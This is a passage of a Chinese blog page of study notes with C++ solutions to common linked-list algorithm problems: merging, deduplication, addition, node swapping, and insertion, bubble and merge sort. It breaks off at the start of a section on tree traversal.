class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1.迭代</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123;</span><br><span class="line">        ListNode* dummyhead=new ListNode(-1);</span><br><span class="line">        ListNode* cur=dummyhead;</span><br><span class="line">        while(l1&amp;&amp;l2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(l1-&gt;val&lt;=l2-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                cur-&gt;next=l1;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                cur-&gt;next=l2;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next=l1?l1:l2;</span><br><span class="line">        return dummyhead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">2.递归</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123;</span><br><span class="line">        if (!l1 || !l2) return !l1 ? l2 : l1;</span><br><span class="line">        if (l1-&gt;val &lt; l2-&gt;val) &#123;</span><br><span class="line">            l1-&gt;next = mergeTwoLists(l1-&gt;next, l2);</span><br><span class="line">            return l1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            l2-&gt;next = mergeTwoLists(l1, l2-&gt;next);</span><br><span class="line">            return l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">合并k个升序链表</span><br><span class="line">    ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123;</span><br><span class="line">        ListNode *ans = nullptr;</span><br><span class="line">        for (size_t i = 0; i &lt; lists.size(); ++i) &#123;</span><br><span class="line">            ans = mergeTwoLists(ans, lists[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="删除升序链表重复节点（一个不保留）"><a href="#删除升序链表重复节点（一个不保留）" class="headerlink" title="删除升序链表重复节点（一个不保留）"></a>删除升序链表重复节点（一个不保留）</h2><p><img src="https://assets.leetcode.com/uploads/2021/01/04/linkedlist1.jpg" alt="img"></p><h2 id="两指针法-pre-cur"><a href="#两指针法-pre-cur" class="headerlink" title="两指针法 pre cur"></a>两指针法 pre cur</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pre、cur分别指向dummy和head</span><br><span class="line">当pre-&gt;val==cur-&gt;val</span><br><span class="line">保持pre不变，cur一直移动到空或者cur-&gt;val!=pre-&gt;val</span><br><span class="line">1.cur==nullptr,只需将pre-&gt;next=cur;</span><br><span class="line">2.cur!=nullptr,将pre-&gt;next=cur;还要将pre=cur，cur=cur-&gt;next</span><br><span class="line">当pre-&gt;val!=cur-&gt;val</span><br><span class="line">只需移动pre=cur,cur=cur-&gt;next</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* deleteDuplicates(ListNode* head) &#123;</span><br><span class="line">        ListNode* dummy=new ListNode(-1);</span><br><span class="line">        dummy-&gt;next=head;</span><br><span class="line">        ListNode* pre=dummy;</span><br><span class="line">        ListNode* cur=head;</span><br><span class="line">        while(cur)</span><br><span class="line">        &#123;</span><br><span class="line">            if(pre-&gt;val==cur-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                while(cur&amp;&amp;cur-&gt;val==pre-&gt;val)</span><br><span class="line">                &#123;</span><br><span class="line">                    cur=cur-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                pre-&gt;next=cur;</span><br><span class="line">                if(cur)</span><br><span class="line">                &#123;</span><br><span class="line">                    pre=cur;</span><br><span class="line">                    cur=cur-&gt;next;   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                pre=cur;</span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="删除链表重复节点（保留一个）"><a href="#删除链表重复节点（保留一个）" class="headerlink" title="删除链表重复节点（保留一个）"></a>删除链表重复节点（保留一个）</h2><p><img src="https://assets.leetcode.com/uploads/2021/01/04/list1.jpg" alt="img"></p><h2 id="三指针法-ppre-pre-cur"><a href="#三指针法-ppre-pre-cur" class="headerlink" title="三指针法 ppre pre cur"></a>三指针法 ppre pre cur</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">将我们的ppre、pre、cur分别放在dummy、head、head-&gt;next</span><br><span class="line">当pre-&gt;val==cur-&gt;val</span><br><span class="line">保持ppre不变，循环移动pre=cur,cur=cur-&gt;next直到cur==nullptr or cur-&gt;val!=pre-&gt;val</span><br><span class="line">1.cur=nullptr，这是ppre-&gt;next=cur；</span><br><span class="line">2.cur-&gt;val!=pre-&gt;val，ppre-&gt;next=cur,pre=cur,cur=cur-&gt;next;</span><br><span class="line">当pre-&gt;val!=cur-&gt;val</span><br><span class="line">ppre=pre;</span><br><span class="line">pre=cur;</span><br><span class="line">cur=cur-&gt;next;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* deleteDuplicates(ListNode* head) &#123;</span><br><span class="line">        ListNode* dummy=new ListNode(-1);</span><br><span class="line">        dummy-&gt;next=head;</span><br><span class="line">        if(head==nullptr||head-&gt;next==nullptr)</span><br><span class="line">        &#123;</span><br><span class="line">            return head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* ppre=dummy;</span><br><span class="line">        ListNode* pre=head;</span><br><span class="line">        ListNode* cur=head-&gt;next;</span><br><span class="line">        while(cur)</span><br><span class="line">        &#123;</span><br><span class="line">            //当前cur-&gt;val==pre-&gt;val</span><br><span class="line">            if(cur-&gt;val==pre-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                while(cur&amp;&amp;cur-&gt;val==pre-&gt;val)</span><br><span class="line">                &#123;</span><br><span class="line">                    pre=cur;</span><br><span class="line">                    cur=cur-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                ppre-&gt;next=cur;</span><br><span class="line">                //两种情况，cur为空和cur不为空</span><br><span class="line">                if(cur)</span><br><span class="line">                &#123;</span><br><span class="line">                    pre=cur;</span><br><span class="line">                    cur=cur-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            //否则cur-&gt;val!=pre-&gt;val</span><br><span class="line">            &#123;</span><br><span class="line">                ppre=pre;</span><br><span class="line">                pre=cur;</span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表相加"><a href="#链表相加" class="headerlink" title="链表相加"></a>链表相加</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) &#123;</span><br><span class="line">   /*     stack&lt;int&gt; s1;</span><br><span class="line">        stack&lt;int&gt; s2; </span><br><span class="line">        ListNode* cur=l1; </span><br><span class="line">         while(cur)</span><br><span class="line">        &#123;</span><br><span class="line">            s1.push(cur-&gt;val);</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur=l2;</span><br><span class="line">        while(cur)</span><br><span class="line">        &#123;</span><br><span class="line">            s2.push(cur-&gt;val);</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125; */ 正序排列时需要先反转链表，使用栈或者自己写反转链表的操作</span><br><span class="line">        </span><br><span class="line">        ListNode* dummy=new ListNode(-1);</span><br><span class="line">        ListNode* cur=dummy;</span><br><span class="line">        int carry=0;</span><br><span class="line">        while(l1||l2||carry)</span><br><span class="line">        &#123;</span><br><span class="line">            int sum=carry;</span><br><span class="line">            if(l1)</span><br><span class="line">            &#123;</span><br><span class="line">                sum+=l1-&gt;val;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            if(l2)</span><br><span class="line">            &#123;</span><br><span class="line">                sum+=l2-&gt;val;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            carry=sum/10;</span><br><span class="line">            int newsum=sum%10;</span><br><span class="line">            cur-&gt;next=new ListNode(newsum);</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="交换相邻两个节点"><a href="#交换相邻两个节点" class="headerlink" title="交换相邻两个节点"></a>交换相邻两个节点</h2><p><img src="https://assets.leetcode.com/uploads/2020/10/03/swap_ex1.jpg" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">思路：1.递归，当需要两个，一般递归就取前两个</span><br><span class="line"> 2.迭代</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ListNode* swapPairs(ListNode* head) &#123;</span><br><span class="line">    if(!head||!head-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        return head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode* pos=head-&gt;next;</span><br><span class="line">    head-&gt;next=swapPairs(pos-&gt;next);</span><br><span class="line">    pos-&gt;next=head;</span><br><span class="line">    return pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    ListNode* swapPairs(ListNode* head) &#123;</span><br><span class="line">        if(!head||!head-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            return head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* dummy=new ListNode(-1);</span><br><span class="line">        dummy-&gt;next=head;</span><br><span class="line">        ListNode* pre=dummy;</span><br><span class="line">        ListNode* cur=head;</span><br><span class="line">        while(cur&amp;&amp;cur-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode* nx=cur-&gt;next;</span><br><span class="line">            pre-&gt;next=nx;</span><br><span class="line">            cur-&gt;next=nx-&gt;next;</span><br><span class="line">            nx-&gt;next=cur;</span><br><span class="line">            pre=cur;</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表插入排序"><a href="#链表插入排序" class="headerlink" title="链表插入排序"></a>链表插入排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ListNode* insertionSortList(ListNode* head) &#123;</span><br><span class="line">    ListNode* dummy=new ListNode(-1);</span><br><span class="line">    dummy-&gt;next=head;</span><br><span class="line">    //第一个元素不用看，直接看第二个元素</span><br><span class="line">    ListNode* cur=head-&gt;next;</span><br><span class="line">    //tail是排好序的最后一个元素</span><br><span class="line">    ListNode* tail=head;</span><br><span class="line">    while(cur)</span><br><span class="line">    &#123;</span><br><span class="line">        //[head,tail]cur</span><br><span class="line">        if(tail-&gt;val&lt;=cur-&gt;val)</span><br><span class="line">        &#123;</span><br><span class="line">            tail=tail-&gt;next;</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            //pre从一个负数开始，避免讨论加在第一个节点的位置</span><br><span class="line">            ListNode* pre=dummy;</span><br><span class="line">            //不用担心越界，外侧else一定有一个cur前面的pre-&gt;next-&gt;val&gt;cur-&gt;val</span><br><span class="line">            while(pre-&gt;next-&gt;val&lt;=cur-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                pre=pre-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            //pre定在最后一个小于等于cur-&gt;val的位置</span><br><span class="line">            ListNode* nx=cur-&gt;next;</span><br><span class="line">            cur-&gt;next=pre-&gt;next;</span><br><span class="line">            pre-&gt;next=cur;</span><br><span class="line">            tail-&gt;next=nx;</span><br><span class="line">            cur=nx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return dummy-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="链表冒泡排序"><a href="#链表冒泡排序" class="headerlink" title="链表冒泡排序"></a>链表冒泡排序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路：不需要判断是否过界，根据结点的个数确保冒泡次数i和每趟比较的次数</span><br><span class="line">为了保留比较两节点最前面的节点通常使用pre-&gt;next-&gt;val与cur比较，即三个节点一组移动</span><br><span class="line">遍历一遍没有交换说明有序，直接退出就行</span><br></pre></td></tr></table></figure><p><strong>如果要使用O(nlogn)对链表排序，最好的方法是使用归并排序</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">步骤:</span><br><span class="line">1.找中点拆分</span><br><span class="line">2.一直递归拆</span><br><span class="line">3.拆完合并</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">ListNode* merge(ListNode* a,ListNode* b)</span><br><span class="line">&#123;</span><br><span class="line">    ListNode* dummy=new ListNode(-1);</span><br><span class="line">    ListNode* head=dummy;</span><br><span class="line">    while(a!=nullptr&amp;&amp;b!=nullptr)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a-&gt;val&lt;b-&gt;val)</span><br><span class="line">        &#123;</span><br><span class="line">            head-&gt;next=a;</span><br><span class="line">            a=a-&gt;next; </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            head-&gt;next=b;</span><br><span class="line">            b=b-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        head=head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next=a==nullptr?b:a;</span><br><span class="line">    return dummy-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">pair&lt;ListNode*,ListNode*&gt; getmid(ListNode* head)</span><br><span class="line">&#123;</span><br><span class="line">    ListNode* fast=head-&gt;next;</span><br><span class="line">    ListNode* slow=head;</span><br><span class="line">    while(fast&amp;&amp;fast-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        fast=fast-&gt;next-&gt;next;</span><br><span class="line">        slow=slow-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode* mid=slow-&gt;next;</span><br><span class="line">    slow-&gt;next=nullptr;</span><br><span class="line">    return &#123;head,mid&#125;;</span><br><span class="line">&#125;</span><br><span class="line">ListNode* mergesort(ListNode* head)</span><br><span class="line">&#123;</span><br><span class="line">    if(head==nullptr||head-&gt;next==nullptr)</span><br><span class="line">    &#123;</span><br><span class="line">        return head;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode* a=nullptr;</span><br><span class="line">    ListNode* b=nullptr;</span><br><span class="line">    tie(a,b)=getmid(head);</span><br><span class="line">    a=mergesort(a);</span><br><span class="line">    b=mergesort(b);</span><br><span class="line">    return merge(a,b);</span><br><span class="line">&#125;</span><br><span class="line">ListNode* sortList(ListNode* head) &#123;</span><br><span class="line">    return mergesort(head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">struct ListNode</span><br><span class="line">&#123;</span><br><span class="line">    int val;</span><br><span class="line">    ListNode* next;</span><br><span class="line">    ListNode(int val)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;val=val;</span><br><span class="line">        next=nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode(int val,ListNode* ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;val=val;</span><br><span class="line">        this-&gt;next=ptr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ListNode* append(ListNode* head,int val)</span><br><span class="line">&#123;</span><br><span class="line">    ListNode* nx=new ListNode(val);</span><br><span class="line">    ListNode* cur=head;</span><br><span class="line">    while(cur-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        cur=cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    cur-&gt;next=nx;</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ListNode* bubbleSort(ListNode* head)</span><br><span class="line">&#123;</span><br><span class="line">    ListNode* dummy=new ListNode(-1);</span><br><span class="line">    dummy-&gt;next=head;</span><br><span class="line">    ListNode* pre=dummy;</span><br><span class="line">    ListNode* cur=head-&gt;next;</span><br><span class="line">    int num=0;</span><br><span class="line">    while(pre)</span><br><span class="line">    &#123;</span><br><span class="line">        pre=pre-&gt;next;</span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    num-=1;</span><br><span class="line">    bool ischange=false;</span><br><span class="line">    for(int i=0;i&lt;num-1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int j=num-i-1;</span><br><span class="line">        pre=dummy;</span><br><span class="line">        cur=dummy-&gt;next-&gt;next;</span><br><span class="line">        while(j--)</span><br><span class="line">        &#123;</span><br><span class="line">            if(pre-&gt;next-&gt;val&gt;cur-&gt;val)</span><br><span class="line">            &#123;</span><br><span class="line">                ListNode* nx=cur-&gt;next;</span><br><span class="line">                pre-&gt;next-&gt;next=nx;</span><br><span class="line">                cur-&gt;next=pre-&gt;next;</span><br><span class="line">                pre-&gt;next=cur;</span><br><span class="line">                pre=cur;</span><br><span class="line">                cur=nx;</span><br><span class="line">                ischange=true;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                pre=pre-&gt;next;</span><br><span class="line">                cur=cur-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(!ischange)</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return dummy-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">void print(ListNode* head)</span><br><span class="line">&#123;</span><br><span class="line">    while(head)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;head-&gt;val&lt;&lt;&quot;-&gt;&quot;;</span><br><span class="line">        head=head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    ListNode* head=new ListNode(5);</span><br><span class="line">    head=append(head,4);</span><br><span class="line">    head=append(head,3);</span><br><span class="line">    head=append(head,2);</span><br><span class="line">    head=append(head,1);</span><br><span class="line">    print(head);</span><br><span class="line">    head=bubbleSort(head);</span><br><span class="line">    print(head);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-树"><a href="#3-树" class="headerlink" title="3.树"></a>3.树</h1><h2 id="迭代遍历方式"><a href="#迭代遍历方式" class="headerlink" title="迭代遍历方式"></a>迭代遍历方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 